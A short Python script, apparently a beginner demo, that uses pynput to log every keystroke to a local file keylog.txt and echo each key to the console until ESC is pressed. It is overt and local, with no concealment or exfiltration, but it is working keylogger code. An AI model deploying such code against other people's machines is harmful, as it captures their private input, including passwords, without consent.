from pynput import keyboard

def on_press(key):
    try:
        # normal key like a, b, c, 1, 2
        keystroke = str(key.char)

    except:
        
        if key == keyboard.Key.space:
            keystroke = " "

        elif key == keyboard.Key.enter:
            keystroke = "\n"

        elif key == keyboard.Key.backspace:
            keystroke = "[BACK]"

        elif key == keyboard.Key.tab:
            keystroke = "[TAB]"

        else:
            keystroke = "[" + str(key) + "]"

    
    file = open("keylog.txt", "a")
    file.write(keystroke)
    file.close()

    
    print("Key pressed:", keystroke)


def on_release(key):
    
    if key == keyboard.Key.esc:
        print("\nKeylogger STOPPED!!")
        print("Check keylog.txt file!!")
        return False    # stops the listener!!



print("KEYLOGGER PROGRAM")
print("-" * 30)
print("Recording all keystrokes...")
print("Press ESC to stop!!")
print("-" * 30)


with keyboard.Listener(
        on_press   = on_press,
        on_release = on_release) as listener:
    listener.join()